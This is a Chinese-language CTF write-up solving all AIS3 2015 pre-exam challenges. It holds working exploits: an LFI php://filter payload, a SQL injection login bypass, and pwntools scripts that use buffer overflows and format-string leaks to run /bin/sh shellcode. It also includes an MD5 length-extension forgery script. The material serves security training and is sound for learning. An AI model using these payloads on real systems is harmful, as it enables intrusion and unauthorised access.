---
title: AIS3 2015 pre-exam -- complete writeup
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- AIS3
- CTF
- Pwnable
- Reversing
- Crypto
- Web
- Python
- C
- PPC
- format_string
- Misc
categories:
- write-ups
date: '2015-08-06 12:15:00 +0000'
toc: true
toc_label: Table of Contents
---

考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人  
這個 blog 的第一篇中文 writeup 就獻給這篇了 XD  
基本上就是全包這次 exam 的所有題目  
有問題歡迎留言討論  

<!-- more -->

# MISC
## MISC1
沒啥特別，範例 flag `AIS3{hello_world}`

## MISC2
給了一個 facebook.zip，有密碼  
老實說我最討厭這種需要解壓縮檔密碼的題目 = =  
每次打 CTF 遇到這類型題目沒有一次解出來過 = =  
也因此是我卡最久的一題  

之後才知道說要用到一種攻擊叫做 **known plaintext attack**  
給定一個加密過的檔案，可以利用原檔案進行攻擊解密出 key  
網路上還有 tool 可以解，叫 [pkcrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html)

因為壓縮檔裡面有張加密過的圖片  
所以可以根據檔名，想辦法 google 到原圖  
然後根據 pkcrack 官方網站裡面的 document 說明來進行解密  
基本上就是將原圖也壓成一個 zip 檔  
之後用 pkcrack 解出 `key0`, `key1` 和 `key2`  
最後用裡面附的 `zipdecrypt` 來解出壓縮檔裡面所有的檔案，就可以拿到 flag 了  
flag: `AIS3{old_trick_fool_the_zip_password}`

## MISC3
Orange 說 MISC3 出錯了 (´・ω・\`)  
導致這題比 MISC2 還要簡單 XD  
給了個壓縮檔，解出來後是張白白的圖片  
乍看之下沒什麼，不過剛好那時我的筆電螢幕有傾斜，看出了色差，所以直接看出了 flag XD  
flag: `AIS3{picture_in_picture_0xcc}`

# WEB
## WEB1
連進去試了幾下之後發現是 LFI 的漏洞  
之後就一直嘗試繞過字串過濾的限制  
然後就卡住了 = =  
最後才發現是要用 `PHP I/O stream` 的 `php://filter` 來將 index.php 的內容轉成 base64 encode 然後 dump 出來  
payload:

```
http://[HOST]/web1/?page=php://filter/convert.base64-encode/resource=index
```

這東西算是打 WEB 的基本 trick  
對於 web 苦手的我來說算是長知識了  
flag: `AIS3{php_wrapper_rocks}`  

## WEB2
給了我們一個 .txt 檔  
一看就知道跟 javascript 有關  
可是一直想不起來它的名字 = =  
google了好久之後才查到它叫 [jsfuck](http://www.jsfuck.com/)  

之後就簡單許多了，直接 google jsfuck decoder 就可以有現成的 code 可以解了  
(聽說可以用 Firefox 秒解)  
flag: `AIS3{fuck_the_javascript_interpreter}`

## WEB3
這次 exam 唯一沒有解出來的一題  
原因也很簡單，就是 web 實力太弱，知道的 trick 不夠多 ( web 真的很吃 trick 啊...)  

總之就是一個有登入頁面跟顯示新聞頁面的網站  
顯示新聞頁面的 URL 有吃 get 參數  
所以就先用 [sqlmap](http://sqlmap.org/) 掃一下  
發現沒洞 ( sqlmap 回報說參數應是有用`int()`擋掉 SQL injection )    

之後就是不斷的嘗試別的思路  
包括從登入頁面那邊用 SQL injection 打進去  
可惜知道的 trick (應該說是 payload format ) 不夠多  
導致試到 exam 結束時都沒有試出來    

之後向 Orange 問了解法以及解題思路，他是這麼回答的:  

> 其實只要在登入頁面的 username 欄位那邊  
> 輸入 `aaaaa\`  
> 就會發現 database error  
> 如此一來就可以推斷出網站沒有濾 `\` 字元  
> 剩下的就是構造 payload

看到這邊，其實還是不是很了解  
主要的原因是因為我一直以為"過濾"`'`字元的意思是說直接把`'`取代成空字串  
但是在問過學長之後，發現其實不是這樣子的  

身為一個 web service  
通常不會把一個使用者的 input 做任意的修改 (包括砍掉其中的字元)  
而是會嘗試將所有的 input 都送進 database 裡面  
因此在遇到`'`字元的時候，通常會利用反斜線來 escape 掉，也就是變成 `\'`  
這樣子的行為也可以是一種"過濾"  

那麼因為網站沒有過濾反斜線，只有過濾`'`  
因此我們在 username 那欄可以這麼輸入: `aaa\' OR 1=1 #`  
這個時候，因為網站過濾`'`但沒有過濾`\`的關係，使得 username 的 data 將會變成 
```
aaa\\' OR 1=1 #
```
塞進 SQL 做 query 時就會變成:
```sql
SELECT * from [table_name] WHERE username = 'aaa\\' OR 1=1 #' AND password = ''
```
如此一來就可以繞過檢查，成功登入(登入之後就會看到 flag 了)

# BINARY
## BINARY1
拿到 binary 之後也沒多想  
直接 `strings` 下下去  
發現有噴出 `AIS3{strings_help_you_a_lot_isnt}`  
直接拿來 submit，瘋狂噴錯 = =  
最後腦補成 `AIS3{strings_help_you_a_lot_isnt_it}`就過了...  

## BINARY2
給了一份文件
```
\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41
\x41\x41\x50\x48\xb8\xbc\xa0\xa9
\x93\xaa\xa3\xbe\x93\x50\x48\xb8
\xa9\x93\xa5\xbf\x93\xbf\xa5\xa1
\x50\x48\xb8\xbf\xa4\xa9\xa0\xa0
\xaf\xa3\xa8\x50\x48\xb8\x8d\x85
\x9f\xff\xb7\xa3\xa7\x93\x50\x48
\x89\xe6\x48\x31\xd2\x80\x34\x16
\xcc\xfe\xc2\x80\xfa\x25\x75\xf5
\x48\x31\xc0\x48\xff\xc0\x48\x89
\xc7\x0f\x05\x6a\x3c\x58\x48\x31
\xff\x0f\x05
```
一開始還以為 decode hex 之後會是一種檔案格式  
結果發現不是，就卡了一段時間  
之後腦洞打開想說會不會是 shellcode  
看了一下 hex value 又覺得應該不是 x86 的 machine code  
於是就直接寫了個 .c 檔編成 64 bit ELF 直接下去跑  
```c
char code[] = "\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41\x41\x41\x50\x48\xb8\xbc\xa0\xa9\x93\xaa\xa3\xbe\x93\x50\x48\xb8\xa9\x93\xa5\xbf\x93\xbf\xa5\xa1\x50\x48\xb8\xbf\xa4\xa9\xa0\xa0\xaf\xa3\xa8\x50\x48\xb8\x8d\x85\x9f\xff\xb7\xa3\xa7\x93\x50\x48\x89\xe6\x48\x31\xd2\x80\x34\x16\xcc\xfe\xc2\x80\xfa\x25\x75\xf5\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05";

int main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
	return 0;
}

```
```
bruce30262@ubuntu:~/Desktop/shellcode$ gcc -z execstack -o shell shell.c
bruce30262@ubuntu:~/Desktop/shellcode$ ./shell
AIS3{ok_shellcode_is_simple_for_you}
```
難怪叫做 sc.txt, SC 就是 shellcode 的縮寫嘛 XD  
收工!  

flag:`AIS3{ok_shellcode_is_simple_for_you}` 

## BINARY3
一開始給了一個叫做 stupid 的 binary  
64 bit ELF，有 strip 過  
那個時候想說要 reverse 覺得好麻煩就先去睡覺了XD  
結果第二天發了第二個版本 stupid_v2，裡面保留了所有的 symbol 資訊  
瞬間變得超級友善XDD  
直接丟進 IDA Pro 做靜態分析就足以把 key 解出來了  

簡單來說程式會要你輸入input  
然後會做兩次檢查( check1 和 check2 )，如果都通過的話就代表你輸入的 input 就是 flag  
雖然說是做兩次檢查，但是因為 check1 和 check2 之間 input 沒有被動到  
且兩者之間毫無關聯性，因此可以推得只要過得了 check2 就一定過得了 check1  
那麼 check1 似乎就不是那麼重要了，重點擺在 check2 即可  

而 check2 的檢查也十分簡單:
```
; key = 0xDDDDAAAADADADDAA ^ (our_input)
cmp     dword ptr key, 0BFB7B8CEh
setz    al
cmp     dword ptr key+4, 0BCB4DEC4h
setz    ah
xor     ax, 101h
```

也就是說，只要我們的 input  xor  `0xDDDDAAAADADADDAA` == `0xBCB4DEC4BFB7B8CE` 的話，就代表著我們的 input = flag  
而 xor 的反解也相當簡單，即再做一次 xor 即可  
因此 flag = `0xDDDDAAAADADADDAA ^ 0xBCB4DEC4BFB7B8CE` = `0x6169746E656D6564`  
之後轉成 ascii code, endianness 注意一下，即可得到正確的 input = `dementia`  

flag: `AIS3{dementia}`

# PWN3D
( pwn 的 flag 全忘光了，這邊就純分享解法 & payload 囉 )
## PWN3D1
64 bit ELF, 直接丟進 IDA Pro 就會看到邪惡的 `scanf()` 和一個看起來就是要你蓋它的變數  
分析了一下，發現只要將那個變數蓋成 `0x90909090` 就會噴 flag  
計算好 offset 之後就可以構造 payload 丟給 server 了  
一開始直接用 `python -c` pipe 進 nc 的方式送  
不知道為什麼一直沒有噴 flag 回來  
最後只好乖乖寫 script   
```python
#!/usr/bin/env python

from pwn import *
import sys
import time

HOST = "52.69.163.194"
PORT = 1111
ELF_PATH = ""
LIBC_PATH = ""

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)

r = remote(HOST, PORT)

if __name__ == "__main__":

    payload = "A"*28 + "\x90\x90\x90\x90" 
    print r.recvuntil("name: \n")
    r.sendline(payload)
    print r.recv(1024)
    r.close()
```

## PWN3D2
32 bit ELF, 單純的 echo server，輸入啥 input 就印啥出來(嗎?)  
```c
int echo()
{
  int v1; // [sp+18h] [bp-14h]@1
  int v2; // [sp+1Ch] [bp-10h]@1

  v1 = 0;
  v2 = 0;
  read(0, &v1, 0x100u);
  return __printf_chk(1, &v1);
}
```
可以看到 `read()` 那邊有個 overflow 的漏洞  
然後 `__printf_chk()` 那邊也有個 format string 的漏洞  

使用 [checksec.sh](http://www.trapkit.de/tools/checksec.html) 檢查之後發現沒開 DEP  
那麼方向就很明顯了: return to shellcode  
先利用 format string leak 出 ebp, 得到目前 stack 的位置，並計算 input buffer 的 address  
透過第一次 overflow 覆寫 return address，讓程式執行完 `echo()` 之後重新回到 `echo()` 的開頭  
此時我們拿到了 input buffer 的 address  
就可以在 buffer 上面塞 shellcode  
並透過第二次的 overflow 讓 return address 跳到我們的 shellcode 上面執行拿到 shell    

要注意的是 buffer 只給我們 20 byte, 而我的 shellcode 有 23 byte  
因此最後我是將 shellcode 塞在 return address 後面，並向後跳至 shellcode 位址執行  
```python
#!/usr/bin/env python

from pwn import *
import sys
import time

HOST = "52.69.163.194"
PORT = 2222
ELF_PATH = ""
LIBC_PATH = ""

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)

r = remote(HOST, PORT)
#r = process("./pwn2")
shellcode_byte = [ 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80 ]

shellcode = ''.join( chr(c) for c in shellcode_byte)


if __name__ == "__main__":

	echo_start = 0x08048540

	# leak ebp
	payload = "%p."*3
	payload = payload.ljust(20, "A")
	payload += p32(echo_start)
	r.sendline(payload)
	
	# calculate buffer address
	resp = r.recv(1024).split(".")[2]
	ret_addr = int(resp, 16) - 0x30 + 28

	# return to shellcode
	payload = "A"*20
	payload += p32(ret_addr)
	payload += "\x90"*10 + shellcode
	r.sendline(payload)
	r.interactive()

```


## PWN3D3
32 bit ELF, 一樣沒開 DEP  

這是一個簡單的模擬 stack 的程式  
功能有 push, pop, show, exit  
push 的話會要你先輸入一個 integer  
之後程式會把這個 integer 放在 stack 上面  
可以透過 show 功能去查看 stack 目前長什麼樣子  
pop 的話會把 stack 上面的一個數字 pop 出來  
exit 則是離開程式

透過一些 fuzzing  
我們可以發現當 stack 上面沒東西的時候  
利用 pop 功能可以 leak 出一些 address，包括 ebp  
因此我們可以利用這個功能來計算當前 stack 的位置以及我們 input buffer 的 address  
至於 push 功能，我們會發現說如果我們一直 push 東西進 stack 的話  
最後會發生 stack overflow, 覆蓋到 return address  
加上沒開 DEP 的關係，因此思路跟 PWN3D2 很像  
先利用 pop 功能 leak 出 ebp 並算出 buffer 的 address  
之後利用 push 功能觸發 buffer overflow 並 return to shellcode 拿 shell  

要注意的是它 stack 上面會存有一個 address  
是 exit 時拿來計算 esp 用的  
因此這個 address 要小心不要被修改到  
還有就是因為這題在蓋的時候是用 integer 在蓋  
因此 payload 都要轉成 integer 的形式 (注意要是 int32 )  

```python
#!/usr/bin/env python

from pwn import *
import sys
import time
import numpy

HOST = "52.69.163.194"
PORT = 3333
ELF_PATH = ""
LIBC_PATH = ""

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)

r = remote(HOST, PORT)
#r = process("./pwn3")

shellcode_byte = [ 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80 ]

# constructing shellcode data
shellcode = [0x90] * 9
for c in shellcode_byte:
	shellcode.append(c)

payload = []
cur = 0
for index, val in enumerate(shellcode):
	now = index % 4
	cur |= val << (now*8)
	if now == 3:
		payload.append(numpy.int32(cur))	
		cur = 0

def pop(r):
	r.sendline("2")
	r.recvuntil("Top item is: ")
	item = r.recvuntil("\n").strip()
	n = numpy.int32(int(item, 16))
	return n

def push(r, num):
	r.sendline("1")
	r.recvuntil("number:\n")
	r.sendline(str(num))

if __name__ == "__main__":

	temp = []

	# leaking ebp
	for i in xrange(4):
		r.recvuntil("4. exit\n")
		temp.append(pop(r))
	
	# calculate buffer address & address for ecx
	buf_addr = numpy.int32(temp[3] - 0x60)
	ecx_addr = numpy.int32(temp[3] + 0x18)
	log.info("buffer address: "+hex(buf_addr&0xffffffff))
	log.info("ecx address: "+hex(ecx_addr&0xffffffff))

	# restore stack
	for c in reversed(temp):
		r.recvuntil("4. exit\n")
		push(r, c)

	# shellcode
	for c in payload:
		r.recvuntil("4. exit\n")
		push(r, c)

	# padding
	for i in xrange(8, 23):
		r.recvuntil("4. exit\n")
		push(r, 1)

	# important address for ecx
	r.recvuntil("4. exit\n")
	push(r, ecx_addr)

	# padding
	for i in xrange(24, 29):
		r.recvuntil("4. exit\n")
		push(r, 1)

	# return address
	r.recvuntil("4. exit\n")
	push(r, buf_addr)

	# invoke BOF
	r.recvuntil("4. exit\n")
	r.sendline("4")

	r.interactive()

```

# CRYPTO
## CRYPTO1
給了一個 vigenere.txt，很明顯的就是要我們解 [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
秉持著懶人懶到底的精神  
直接 google "vigenere cipher decoder"，找到了一堆網站  
通通丟進去解，接著開始拼拼湊湊( 總不可能解完整 )  
最後靠著 [這個](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx) 還有 [這個](https://f00l.de/hacking/vigenere.php) 推出 key 的位置在  
```
http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt
```
進去之後就是 flag 了  

flag:`AIS3{i_am_scared_of_you}`

## CRYPTO2
基礎的 RSA cracking  
之前打 CTF 都是交給強者我隊友  
自己解一遍之後才發現有多不熟 XDrz  

給了一份壓縮檔，解完之後有兩個檔案  
flag.enc 是經過 RSA 加密過後的 flag  
rsa.py 裡面則是提供了 n 和 e  

看 n 似乎不大，可以爆出來  
於是開了 [yafu](http://sourceforge.net/projects/yafu/) 開始爆 pq  
等待的同時順便將 n 丟進 [factordb.com](http://factordb.com/) 試試手氣  
結果似乎已經有人將他解出來並丟到上面去了XD  
不過用 yafu 爆也是爆得出來就是了，時間差不多 100 秒左右    

有了 p 跟 q 之後就可以利用 [rsatool](https://github.com/ius/rsatool) 來產生 PEM encode 後的 private key  
openssl 指令下一下之後就可以解出 flag 了   
```
openssl rsautl -in flag.enc -inkey key.pem -decrypt
```

flag:`AIS3{rsaaaaaaaaA_orz}`

## CRYPTO3
耗費最多心力的一題，解完之後經驗值又增加了 XD  

給了一份 buy.py
```python
#!/usr/bin/python

import os
import sys
import signal
import hashlib
from urlparse import parse_qsl


def md5(s):
	global KEY
	return hashlib.md5(KEY[:16] + s).hexdigest()

def get_number(msg):
	num = raw_input(msg).strip()
	try:
		num = int(num)
	except ValueError:
		return 0
		
	return num

def pick_orange(num):
	data = 'num=%d&price=10' % num
	print 'OK, this is your order information. You can check out with this code'
	print '%s-----%s' % (data, md5(data))

def check_out():
	global MONEY
	s = raw_input('Input your order information: ').strip()
	if '-----' in s:
		data, hmac = s.split('-----', 1)
		if md5(data) == hmac:
			info = dict( parse_qsl(data) )
			num   = info.get('num', 0)
			price = info.get('price', 10)

			try:
				num = int(num)
				price = int(price)
			except ValueError:
				num = 0
				price = 10

			if isinstance(num, int) and isinstance(price, int):
				print 'You buy %d oranges' % num
				print 'Per price of orange is $%d' % price

				if num * price > MONEY:
					print 'You are too poor'
				else:
					MONEY = MONEY - num*price
					print 'OK, you bought'

				return 

	print 'Order information not correct'



def get_flag():
	global MONEY, FLAG
	if MONEY > 1000000:
		print 'Cong, the flag is %s' % FLAG
		exit()
	else:
		print 'Oh no, you are too poor'

def show_money():
	global MONEY
	print 'You now have $%d' % MONEY

def motd():
	print '''
	-----------------------------------
	Welcome to Online Shopping Mall.
	[1] Pick oranges into shopping cart
	[2] Check out
	[3] Show money
	[4] Get flag
	[5] Exit
	-----------------------------------
	'''

def main():
	while 1:
			motd()
			choice = get_number('Input your choice: ')
			if 	 choice == 1:
				num = get_number('How many oranges do you want to buy ?')
				if num > 0:
					pick_orange(num)
				else:
					print 'What do you do ?'
			elif choice == 2:
				check_out()
			elif choice == 3:
				show_money()
			elif choice == 4:
				get_flag()
			else:
				print 'bye'
				break

def challenge():
	with open('/dev/urandom', 'r') as fp:
		rand = fp.read(8)

	print 'challenge: 0x%s' % rand.encode('hex')
	res = raw_input('Enter response: ').strip()

	if not hashlib.md5( rand + res ).hexdigest().startswith('fffff'):
		print 'Challenge failed'
		exit()

def alarm():
	def handler(signum, frame):
		print 'Timeout!'
		exit()
	signal.signal(signal.SIGALRM, handler)
	signal.alarm( 30 )

if __name__ == '__main__':
	sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
	sys.stdin  = os.fdopen(sys.stdin.fileno(), 'r', 0)



	sys.dont_write_bytecode = True
	from conf import KEY, FLAG, MONEY


	try:
		challenge()
		alarm()
		main()
	except KeyboardInterrupt:
		pass

```
看懂之後有兩個重點:  
1. 利用他給的 challenge 爆 md5, 先過第一關  
2. 開始買橘子，買完之後錢要 > 1000000 來拿 flag  

第一關還好，寫個 script 爆一下就 ok 了  
重點是第二關  
買橘子在 check out 的時候會要先給它一個 order information  
形式為: `"num=XXX&price=XXX-----[md5 hash]"`  
其中 md5 hash 那邊是指 `"num=XXX&price=XXX"` 的 md5 hash  

程式會將 `-----` 之前的字串視為 data, 之後的字串 ( 就是 md5 hash ) 視為 hmac  
我們輸入 order information 的時候，程式會先做以下檢查  
`md5(key[:16]+data) == hmac` ( key 未知 )  
通過的話才會讓我們 check out (正式扣錢，買到橘子)  

問題在於我們一開始的錢是 100 塊  
理論上不管怎麼買都不可能買到 1000000  
手上握有的資訊就只有 `"num=XXX&price=10"` ( XXX 可控 ) 和其 md5 hash 值  
因此在這裡卡了一段時間  

之後才發現有個 attack 叫做 Length Extension Attack (LEA)  
詳情可參考 [這篇](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) 和 [這篇](http://ddaa.logdown.com/posts/194524-plaid-ctf-2014-crypto-250-parlor)
簡單來說就是如果我有辦法知道 `md5(a)` 的值  
那麼我就可以預測 `md5(a + padding + append)` 的值  
其中 `padding` 字串須透過計算來得到  
而 `append` 則是我們想要附加上去的字串  

也就是說，假設今天我們知道 `key[:16]+"num=11111111&price=10"` 的 md5 hash 值  
我們就可以預測 `key[:16]+"num=11111111&price=10" + [padding] + "&price=-1"` 的 md5 hash 值  
如此一來就可以構造假的 order information 來繞過檢查，買到 11111111 個價值 -1 塊的橘子  
我們的錢就可以突破 1000000 了  
( 注意在 checkout 時 price 的值是用 `info.get('price', 10)` 來得到的，因此 `...&price=10abcdefg...&price=-1`, 所拿到的值最終會是 -1 )

網路上也已經有工具幫我們做這件事了 -- [HashPump](https://github.com/bwall/HashPump)  
可以直接算出 padding 和預測出來的 md5 hash 值  
不過這題很靠背的一點是在於 key[:16] 這行  
如果 key 不滿 16 字元的話就會取到該字串長度為止  
所以 key 不一定是 16 字元，長度有可能是 1 ~ 16 = =  
超級心機啊，太淫蕩惹 Orz  
害我一開始本地端測試 ok 之後丟到 server 那邊發現怎麼一直不 work  
原來就是因為這個原因...  
最後直接手動建了 key length = 1 ~ 16 的 payload 和 hash 值一個一個送  
才發現 key length = 12...  

```python
#!/usr/bin/env python
from pwn import *
import itertools
import hashlib
import subprocess

HOST = "52.69.163.194"
#HOST = "localhost"
PORT = 7788

all_str = [chr(c) for c in xrange(0, 256)]

def myexec(cmd):
	return subprocess.check_output(cmd, shell=True)

def pass_challenge(seed):
	log.info("seed: " + seed.encode('hex'))
	for cnt in xrange(1, 6):
		for c in itertools.product(all_str, repeat=cnt):
			resp = ''.join(c)
			test = seed + resp
			if hashlib.md5( test ).hexdigest().startswith('fffff'):
				log.info("found: " + resp.encode('hex'))
				log.info("verify: " + hashlib.md5(test).hexdigest())
				return resp

if __name__ == "__main__":

	r = remote(HOST, PORT)

	payload = "num=11111111&price=10\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00&price=-1"

	final_payload = payload + "-----571297fb4b5b065155bc5a3faa2a9a3d"

	r.recvuntil("challenge: 0x")
	seed = r.recv(16).decode('hex')
	r.recvuntil("Enter response: ")
	resp = pass_challenge(seed)
	log.info("sending resp:" + resp)
	r.sendline(resp)

	r.recvuntil("Input your choice: ")
	r.sendline("2")
	r.recvuntil("information: ")
	log.info("sending payload:" + final_payload)
	r.sendline(final_payload)
	r.interactive()

```

flag: `AIS3{give_me_mdfive}`

# 心得
這次的題目大部分都出得很不錯  
撇開有些題目頗電波不說  
基本上難度還算適中  
不管是新的攻擊技巧還是解題思路  
都從這次的題目裡面學到蠻多東西的  

最後差一題 WEB3 破台, RANK 11  
其實還蠻可惜的，本來最高衝到第四說  
主要是第二天晚上看到電視在播不可能的任務4，就放掉耍廢了XD  
一覺醒來直接掉到十名外，嘖嘖  
看到同是 BambooFox 的 [ddaa](http://ddaa.tw/), [Lays](http://l4ys.tw/) 和 [AngelBoy ( malloc )](http://angelboy.logdown.com/) 等人都在第二天相繼破台  
自己卻還差他們一截，就覺得自己還有許多不足的地方  
能夠拿來說嘴的頂多就是這次 PWN3D 是第二個 AK 的   
( 第一天晚上睡覺前看到 PWN3D3 只有 2 個人解應該沒有錯 )  

如何快速學習一個自己不知道的東西真的很重要  
不管是 WEB 還是其他類型的題目  
我發現自己還是十分缺乏快速 google + 現學現賣的能力  
很多時候都找不到合適的關鍵字，導致在解題時常常會卡住，而且一卡就卡很久  
這都是自己必須要趕快加強，改進的地方  
想要往更高的境界邁進，勢必得付出更多的努力才行  
繼續加油，努力學習吧!